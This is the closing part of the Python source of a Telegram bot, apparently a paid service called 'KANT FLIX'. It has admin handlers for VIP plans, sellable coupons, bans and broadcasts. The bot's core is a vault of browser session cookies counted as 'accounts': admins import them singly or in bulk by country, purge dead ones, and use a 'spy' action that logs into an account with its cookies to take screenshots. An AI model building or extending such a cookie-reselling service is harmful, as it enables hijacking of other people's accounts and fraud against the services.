                    bot.send_document(call.message.chat.id, doc, caption="💾 Backup BD Actual")
                    
        elif call.data == "admin_export_users":
            with open('users_export.txt', 'w', encoding='utf-8') as f:
                f.write("ID | Username | Nombre | Plan | Ref | Fecha Ingreso\n")
                f.write("-" * 75 + "\n")
                for uid, p in db['user_profiles'].items():
                    f.write(f"{uid} | @{p.get('username','N/A')} | {p.get('first_name','N/A')} | {p.get('plan')} | {p.get('referrals')} | {p.get('first_seen')}\n")
            with open('users_export.txt', 'rb') as doc:
                bot.send_document(call.message.chat.id, doc, caption="📄 Lista Completa de Usuarios")
            os.remove('users_export.txt')
                    
        elif call.data == "admin_bans":
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔨 Banear ID", callback_data="ban_user"), InlineKeyboardButton("🕊️ Desbanear ID", callback_data="unban_user"))
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="🛡️ **Panel de Bloqueos**", reply_markup=markup, parse_mode="Markdown")

        elif call.data == "admin_clear_dead_cookies":
            initial = len(db['cookies_list'])
            db['cookies_list'] = [c for c in db['cookies_list'] if c['status'] == 'active']
            deleted = initial - len(db['cookies_list'])
            save_db(db)
            bot.answer_callback_query(call.id, f"🧹 Limpieza: {deleted} cuentas agotadas eliminadas.", show_alert=True)

        elif call.data == "admin_clear_cache":
            auto_repair_system()
            bot.answer_callback_query(call.id, "⚙️ Servidor purgado y RAM liberada con éxito.", show_alert=True)
            
        elif call.data == "admin_toggle_maint":
            db['maintenance_mode'] = not db.get('maintenance_mode', False)
            save_db(db)
            bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=admin_panel_keyboard(db))
    except Exception as e:
        bot.answer_callback_query(call.id, "❌ Error en el panel.")
        print(e)

def _edit_plan_limit(message, plan_type):
    try:
        new_limit = int(message.text.strip())
        db = init_db()
        db['plans'][plan_type]['daily_limit'] = new_limit
        save_db(db)
        bot.reply_to(message, f"✅ Límite para el plan **{plan_type.upper()}** actualizado a: `{new_limit}` por día.", parse_mode="Markdown")
    except:
        bot.reply_to(message, "❌ Por favor, envía un número entero válido.")

def process_create_coupon(message):
    try:
        days = int(message.text.strip())
        db = init_db()
        code = generate_coupon_code(days)
        db['coupons'][code] = {'days': days}
        save_db(db)
        bot.reply_to(message, f"✅ **CUPÓN GENERADO**\n\n🎟️ Código: `{code}`\n⏳ Duración: {days} días VIP\n\nPuedes vender o enviar este código al cliente.", parse_mode="Markdown")
    except:
        bot.reply_to(message, "❌ Por favor, envía un número de días válido.")

def process_manage_user(message):
    uid = message.text.strip()
    db = init_db()
    if uid in db['user_profiles']:
        msg = bot.reply_to(message, f"👤 Usuario @{db['user_profiles'][uid].get('username')}.\n\nEscribe `VIP 30` para darle 30 días VIP.\nEscribe `FREE` para quitarle el VIP.")
        bot.register_next_step_handler(msg, lambda m: process_manage_user_action(m, uid))
    else:
        bot.reply_to(message, "❌ ID no encontrada.")

def process_manage_user_action(message, uid):
    text = message.text.strip().upper().split()
    db = init_db()
    try:
        action = text[0]
        if action == "VIP":
            amount = int(text[1])
            new_expiry = datetime.now() + timedelta(days=amount)
            db['user_profiles'][uid]['plan'] = 'vip'
            db['user_profiles'][uid]['vip_expiry'] = new_expiry.strftime("%Y-%m-%d %H:%M:%S")
            bot.reply_to(message, f"✅ Usuario {uid} convertido a VIP por {amount} días.")
            try: bot.send_message(uid, f"🎁 **¡El Administrador te ha activado {amount} días VIP!**")
            except: pass
        elif action == "FREE":
            db['user_profiles'][uid]['plan'] = 'free'
            db['user_profiles'][uid]['vip_expiry'] = None
            bot.reply_to(message, f"✅ Usuario {uid} degradado a plan Gratis.")
        save_db(db)
    except:
        bot.reply_to(message, "❌ Formato incorrecto.")

@bot.callback_query_handler(func=lambda call: call.data.startswith("spy_") or call.data.startswith("del_admin_") or call.data in ["add_new_admin", "ban_user", "unban_user", "noop"])
def manage_actions(call):
    db = init_db()
    if call.data == "noop": return
    if call.data.startswith("spy_"):
        idx = int(call.data.replace("spy_", ""))
        bot.answer_callback_query(call.id, "📸 Mandando ninja virtual...")
        wait_msg = bot.send_message(call.message.chat.id, f"🕵️‍♂️ Conectando a la cuenta #{idx+1} para hacer captura...")
        threading.Thread(target=background_spy, args=(call.message.chat.id, wait_msg.message_id, db['cookies_list'][idx]['data'])).start()
    elif call.data.startswith("del_admin_"):
        if call.from_user.id != SUPER_ADMIN_ID: return
        target = int(call.data.replace("del_admin_", ""))
        if target in db['admins']:
            db['admins'].remove(target); save_db(db)
            bot.answer_callback_query(call.id, "Admin eliminado.", show_alert=True)
    elif call.data == "add_new_admin":
        msg = bot.send_message(call.message.chat.id, "Envía la ID del nuevo admin:")
        bot.register_next_step_handler(msg, lambda m: _add_admin(m))
    elif call.data == "ban_user":
        msg = bot.send_message(call.message.chat.id, "Envía la ID del usuario a bloquear:")
        bot.register_next_step_handler(msg, lambda m: _ban_unban(m, True))
    elif call.data == "unban_user":
        msg = bot.send_message(call.message.chat.id, "Envía la ID del usuario a perdonar:")
        bot.register_next_step_handler(msg, lambda m: _ban_unban(m, False))

def _add_admin(m):
    try:
        db = init_db(); db['admins'].append(int(m.text.strip())); save_db(db)
        bot.reply_to(m, "✅ Admin añadido con éxito.")
    except: pass

def _ban_unban(m, ban):
    try:
        db = init_db(); uid = int(m.text.strip())
        if ban: 
            if uid not in db['banned_users']: db['banned_users'].append(uid)
            bot.reply_to(m, "✅ Usuario bloqueado de por vida.")
        else: 
            if uid in db['banned_users']: db['banned_users'].remove(uid)
            bot.reply_to(m, "✅ Usuario desbaneado.")
        save_db(db)
    except: bot.reply_to(m, "❌ ID inválida.")

def process_add_cookie_country(m):
    country = m.text.strip().capitalize()
    msg = bot.send_message(m.chat.id, "🍪 Pega el texto (JSON o formato Checker/Netscape):")
    bot.register_next_step_handler(msg, lambda x: process_add_cookie_data(x, country))

def process_add_cookie_data(message, country):
    data = message.text.strip()
    try: 
        cookies = json.loads(data)
    except: 
        cookies = parse_netscape_cookies(data)
        
    if cookies:
        db = init_db()
        db['cookies_list'].append({'country': country, 'data': json.dumps(cookies) if isinstance(cookies, list) else cookies, 'uses': 0, 'status': 'active'})
        save_db(db); bot.reply_to(message, "✅ Cookie guardada con éxito en la bóveda.")
    else: bot.reply_to(message, "❌ Error de formato.")

def process_bulk_country(m):
    c = m.text.strip().capitalize()
    msg = bot.send_message(m.chat.id, "📥 Pega el JSON Array Gigante:")
    bot.register_next_step_handler(msg, lambda x: process_bulk_data(x, c))

def process_bulk_data(m, c):
    try:
        data = json.loads(m.text.strip())
        db = init_db(); added = 0
        for arr in data:
            db['cookies_list'].append({'country': c, 'data': json.dumps(arr), 'uses': 0, 'status': 'active'})
            added += 1
        save_db(db); bot.reply_to(m, f"✅ Lote importado: {added} cuentas nuevas.")
    except: bot.reply_to(m, "❌ Error importando. Asegúrate de que es un JSON válido.")

def process_broadcast(message):
    db = init_db()
    count = 0
    bot.reply_to(message, "⏳ Enviando masivo...")
    for uid in db.get('user_profiles', {}).keys():
        try: 
            bot.send_message(int(uid), f"🔔 **MENSAJE DEL ADMINISTRADOR** 🔔\n\n{message.text}", parse_mode="Markdown")
            time.sleep(0.05)
            count += 1
        except: pass
    bot.send_message(message.chat.id, f"✅ Mensaje completado. Recibido por {count} usuarios.")

@app.route('/')
def home(): return "🚀 Servidor KANT FLIX Operativo y Despierto"

def run_web_server():
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

if __name__ == "__main__":
    init_db()
    threading.Thread(target=run_web_server, daemon=True).start()
    while True:
        try:
            bot.infinity_polling(timeout=10, long_polling_timeout=5)
        except Exception as e:
            time.sleep(5)
